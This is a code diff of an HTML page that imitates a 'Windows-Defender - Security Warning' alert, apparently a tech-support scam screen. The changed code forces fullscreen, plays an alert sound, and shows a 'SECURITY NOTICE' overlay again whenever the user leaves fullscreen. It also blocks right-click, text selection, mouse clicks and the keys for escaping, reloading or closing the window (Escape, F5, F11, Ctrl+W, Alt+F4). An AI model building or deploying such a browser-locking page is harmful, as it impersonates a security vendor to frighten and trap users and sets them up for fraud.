@@ -97,7 +97,6 @@
       font-size: 1.08em;
       margin: 0;
     }
-    /* Hide any buttons or browser-like controls */
     .buttons-row, .close, .minimize, .maximize {
       display: none !important;
     }
@@ -111,7 +110,6 @@
     }
   </style>
   <script>
-    // --- FULL SCREEN MANAGEMENT ---
     function goFullscreen() {
       let el = document.documentElement;
       if (el.requestFullscreen) return el.requestFullscreen();
@@ -119,39 +117,32 @@
       if (el.msRequestFullscreen) return el.msRequestFullscreen();
     }
 
+    function showPrompt() {
+      const p = document.getElementById('fs-prompt');
+      if (p) p.style.display = 'flex';
+    }
     function hidePrompt() {
       const p = document.getElementById('fs-prompt');
       if (p) p.style.display = 'none';
     }
 
-    // Re-enter fullscreen if exited
-    function reEnterFullscreen() {
-      if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
-        goFullscreen();
-      }
+    function attemptFullscreen() {
+      goFullscreen();
+      hidePrompt();
+      playAlert();
     }
 
-    document.addEventListener('fullscreenchange', reEnterFullscreen);
-    document.addEventListener('webkitfullscreenchange', reEnterFullscreen);
-    document.addEventListener('msfullscreenchange', reEnterFullscreen);
-
-    // --- Block user actions ---
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => {
-      // Block Escape, F11, F5, Ctrl+W, Ctrl+R, Alt+F4, Cmd+W (Mac)
+    function onFullscreenChange() {
       if (
-        ['Escape', 'F11', 'F5'].includes(e.key) ||
-        (e.ctrlKey && ['w','r'].includes(e.key.toLowerCase())) ||
-        (e.metaKey && ['w','r'].includes(e.key.toLowerCase())) ||
-        (e.altKey && e.key.toLowerCase() === 'f4')
+        !document.fullscreenElement &&
+        !document.webkitFullscreenElement &&
+        !document.msFullscreenElement
       ) {
-        e.preventDefault();
-        e.stopPropagation();
-        return false;
+        showPrompt();
+      } else {
+        hidePrompt();
       }
-    }, true);
-    document.addEventListener('mousedown', e => e.preventDefault());
-    document.onselectstart = () => false;
+    }
 
     // --- Sound effect logic ---
     let soundPlayed = false;
@@ -166,29 +157,49 @@
       }
     }
 
-    // --- Initial actions ---
-    function triggerFullscreenAndAlert() {
-      goFullscreen();
-      hidePrompt();
-      playAlert();
-      // Remove listeners after first trigger
-      document.removeEventListener('click', triggerFullscreenAndAlert);
-      document.removeEventListener('mousemove', triggerFullscreenAndAlert);
-    }
+    // --- Block user actions ---
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (
+        ['Escape', 'F11', 'F5'].includes(e.key) ||
+        (e.ctrlKey && ['w','r'].includes(e.key.toLowerCase())) ||
+        (e.metaKey && ['w','r'].includes(e.key.toLowerCase())) ||
+        (e.altKey && e.key.toLowerCase() === 'f4')
+      ) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
+    }, true);
+    document.addEventListener('mousedown', e => e.preventDefault());
+    document.onselectstart = () => false;
 
     window.onload = () => {
-      // Show prompt; fullscreen must be triggered by user action
+      // Show prompt overlay
+      showPrompt();
+
+      // Only allow fullscreen on user gesture (click or keydown)
       const prompt = document.getElementById('fs-prompt');
-      prompt.style.display = 'flex';
-      document.addEventListener('click', triggerFullscreenAndAlert);
-      document.addEventListener('mousemove', triggerFullscreenAndAlert);
+      prompt.addEventListener('click', attemptFullscreen);
+      prompt.addEventListener('keydown', attemptFullscreen);
+      // Focus for keydown to work
+      prompt.setAttribute('tabindex', '0');
+      prompt.focus();
+
+      // Listen for fullscreen exit
+      document.addEventListener('fullscreenchange', onFullscreenChange);
+      document.addEventListener('webkitfullscreenchange', onFullscreenChange);
+      document.addEventListener('msfullscreenchange', onFullscreenChange);
     };
   </script>
 </head>
 <body>
   <div id="fs-prompt" class="fullscreen-prompt" style="display:none;">
-    Click or move your mouse anywhere to continue<br>
-    <span>(This site requires fullscreen mode)</span>
+    <div>
+      <b>SECURITY NOTICE</b><br><br>
+      This site requires fullscreen mode.<br>
+      <span>Click anywhere or press any key to continue.</span>
+    </div>
   </div>
   <div class="overlay-blue">
     <b>Windows-Defender - Security Warning</b><br>
